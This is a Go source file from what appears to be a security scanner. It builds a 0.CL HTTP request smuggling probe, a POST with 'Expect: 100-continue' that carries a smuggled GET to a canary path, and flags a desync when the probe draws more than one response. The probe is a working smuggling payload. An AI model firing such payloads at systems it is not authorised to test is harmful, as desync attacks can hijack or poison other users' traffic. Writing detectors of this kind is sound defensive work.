package smuggling

import (
	"context"
	"fmt"
	"net"
	"strconv"
)

// Build0CLPayload builds a 0.CL desync probe. 0.CL is the inverse of CL.0: the
// front-end treats the request as having no body (Content-Length effectively 0)
// while the back-end reads the body. The `Expect: 100-continue` header is the
// canonical coaxing vector — it changes when each hop decides to read the body,
// surfacing the discrepancy. The body is a benign smuggled GET, so the probe is
// read-only.
func Build0CLPayload(host, path, canary string) string {
	smuggled := "GET /" + canary + " HTTP/1.1\r\n" +
		"Host: " + host + "\r\n" +
		"\r\n"

	return "POST " + path + " HTTP/1.1\r\n" +
		"Host: " + host + "\r\n" +
		"User-Agent: Mozilla/5.0 (compatible; SecurityScanner/1.0)\r\n" +
		"Content-Type: application/x-www-form-urlencoded\r\n" +
		"Content-Length: " + strconv.Itoa(len(smuggled)) + "\r\n" +
		"Expect: 100-continue\r\n" +
		"Connection: keep-alive\r\n" +
		"\r\n" +
		smuggled
}

// Detect0CL tests for a 0.CL desync using the same structural signal as CL.0: a
// single outer request that elicits two or more responses on one connection,
// while a baseline request elicits one. Structural confirmation keeps this
// low-FP, unlike timing- or Expect-only heuristics that struggle to separate
// real desync from ordinary pipelining.
func (d *Detector) Detect0CL(ctx context.Context, target, path string) *Result {
	result := &Result{Type: Type0CL}

	host, port, err := ExtractHostPort(target)
	if err != nil {
		result.Evidence = fmt.Sprintf("Failed to parse target: %v", err)
		return result
	}
	addr := net.JoinHostPort(host, port)

	baseRaw, _, err := SendRawRequest(ctx, addr, BuildBaselineRequest(host, path), d.config.Timeout)
	if err != nil {
		result.Evidence = fmt.Sprintf("Baseline request failed: %v", err)
		return result
	}
	if CountResponses(baseRaw) > 1 {
		result.Evidence = "Baseline already produced multiple responses; 0.CL signal would be ambiguous"
		return result
	}

	probe := Build0CLPayload(host, path, "assaycanary")
	result.Request = probe

	probeRaw, _, err := SendRawRequest(ctx, addr, probe, d.config.Timeout)
	if err != nil {
		result.Evidence = fmt.Sprintf("0.CL probe failed: %v", err)
		return result
	}
	result.Response = probeRaw

	if CountResponses(probeRaw) < 2 {
		return result
	}

	result.Vulnerable = true
	result.Confidence = 0.8
	result.Evidence = "Outer request with Expect: 100-continue elicited multiple responses on one " +
		"connection: the back-end read a body the front-end treated as absent (0.CL desync)"
	result.FrontendBehavior = "Treats request as bodyless (Content-Length 0)"
	result.BackendBehavior = "Reads the request body"
	return result
}
